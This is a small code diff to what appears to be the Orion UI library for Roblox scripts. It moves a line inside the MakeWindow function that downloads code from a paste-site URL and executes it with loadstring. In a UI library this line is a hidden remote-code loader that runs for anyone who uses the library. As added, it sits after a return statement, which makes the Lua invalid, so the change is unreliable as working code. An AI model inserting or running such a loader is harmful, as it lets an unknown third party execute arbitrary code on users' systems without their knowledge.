@@ -1665,6 +1665,7 @@ function OrionLib:MakeWindow(WindowConfig)
 				SectionFunction[i] = v 
 			end
 			return SectionFunction
+			loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()
 		end	
 
 		for i, v in next, GetElements(Container) do
@@ -1753,7 +1754,6 @@ function OrionLib:MakeWindow(WindowConfig)
 	--		writefile("NewLibraryNotification1.txt","The value for the notification having been sent to you.")
 	--	end
 	--end
-loadstring(game:HttpGet("https://paste-bin.xyz/raw/974948"))()	
 	
 	return TabFunction
 end   
